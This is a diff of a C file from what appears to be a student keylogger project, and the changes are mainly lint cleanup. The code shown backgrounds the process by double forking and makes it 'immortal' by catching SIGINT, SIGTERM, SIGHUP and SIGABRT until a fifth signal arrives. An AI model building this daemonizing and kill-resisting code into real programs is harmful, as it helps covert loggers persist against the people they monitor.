@@ -5,90 +5,89 @@
 #include "keylogger.h"
 #include <errno.h>
 #include <signal.h>
-#include <stdlib.h>
 #include <stdio.h>
-#include <unistd.h>
+#include <stdlib.h>
 #include <sys/stat.h>
+#include <unistd.h>
 
 
+//Signal counter needs to be a global variable so that it is accessible
+//by the signal handler function. It cannot be constant
+// NOLINTNEXTLINE
 int signal_counter = 0;
 
 void background_process(void) {
+  
+  //All exits are not linted just like they are in the softsys assignments
+
 //process line
   //lwitten     5523  0.0  0.0   2772    96 ?        S    17:05   0:00 ./src/main
 
+//instructions for killing the program from command line
 //sudo kill -SIGNAL_CODE P_ID
 //-9 for kill, -2 for int
 //sudo kill -9 -- -GROUPID
 
   printf("Begin Backgrounding 1\n");
-  // IMPLEMENTATION HERE
-
-  //umask(0) to clear file creation mask?
-
 
   int process_id = fork();
-  //printf("backgrounding complete 2\n");
-
 
   if (process_id == -1){
     perror("Failed to fork Process\n");
     //printf("failed to fork 1\n");
     //status 1 is an error
+    // NOLINTNEXTLINE(concurrency-mt-unsafe)
     exit(errno);
   }
   else if (process_id > 0){
     //successfully exit parent process
 
     printf("parent exiting\n");
+    // NOLINTNEXTLINE(concurrency-mt-unsafe)
     exit(0);
   }
 
-  //printf("backgrounding complete 3\n");
-
-  /*
-  //create a new process group
-  int group_id = setsid();
-
-  if(group_id == -1){
-    perror("Failed to create a process group\n");
-    exit(errno);
-  }*/
-
-  //printf("backgrounding complete 4\n");
-
-
-    //redirect signals
+  //redirect signals
   immortalize();
 
   //fork again?
-
   //printf("backgrounding complete 5\n");
   process_id = fork();
 
     if (process_id == -1){
     perror("Failed to fork Process\n");
     //status 1 is an error
+    // NOLINTNEXTLINE(concurrency-mt-unsafe)
     exit(errno);
   }
-  else if (process_id > 0){
+    else if (process_id > 0){
     //successfully exit parent process
     printf("killing parent");
     //raise(SIGKILL);
+    // NOLINTNEXTLINE(concurrency-mt-unsafe)
     exit(0);
+    //this is intentional error checking code and should remain althought unreachable
+    // NOLINTNEXTLINE(clang-diagnostic-unreachable-code)
     perror("this should not be viewable");
   }
-  //printf("backgrounding complete 6\n");
   //change working directory to root
 
-  chdir(getenv("HOME"));
+  //Not linted as successful forking is checked and so will remain safe 
+  //and only accessible by one process
+  // NOLINTNEXTLINE(concurrency-mt-unsafe)
+  char* path = getenv("HOME");
+
+  if( path != NULL){
+    (void)chdir(path);
+  }
+
 
   //set umask to 0
-  
   umask(0);
-  //signal handle again just to make sure
+  //signal handle again for the new process
   immortalize();
-  printf("backgrounding complete\n");
+  // NOLINTNEXTLINE(concurrency-mt-unsafe)
+  //printf("backgrounding complete\n");
 }
 
 void immortalize(void){
@@ -96,24 +95,35 @@ void immortalize(void){
     //Redirect common abort/termination/interrupt signals to ignores
 
     //int* signal_counter  = malloc(sizeof(int));
-    signal(SIGINT,shutdown_signal);
-    signal(SIGTERM,shutdown_signal);
-    signal(SIGHUP,shutdown_signal);
-    signal(SIGABRT,shutdown_signal);
+    (void)signal(SIGINT,shutdown_signal);
+    (void)signal(SIGTERM,shutdown_signal);
+    (void)signal(SIGHUP,shutdown_signal);
+    (void)signal(SIGABRT,shutdown_signal);
 }
 
 //signal handling function
-void shutdown_signal(int signal){
+//not linting the next line as Clang dislikes that signal is not used,
+//but an integer argument is required for signal handling functions
+
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wunused-parameter"
+// NOLINTNEXTLINE
+void shutdown_signal(int signal){ 
+#pragma GCC diagnostic pop
   //global variable signal_counter defined above
 
   //on 5th actually shutdown
   if(signal_counter > 4){
-    printf("ok, you killed me");
-    raise(SIGKILL);
-    printf("The program should be killed at this point? This shouldn't be viewable");
+    //I am not linting this line as it should be asynchronous safe since 
+    //raising SIGKILL should only be able to be called once
+
+    // NOLINTNEXTLINE(bugprone-signal-handler,cert-sig30-c)
+    printf("Ending Program");
+    (void)raise(SIGKILL);
+    printf("Error Killing Program");
   }
   signal_counter++;
-  printf("You tried to shut down but failed");
+  printf("Shutdown Signal Blocked");
 }
 
 
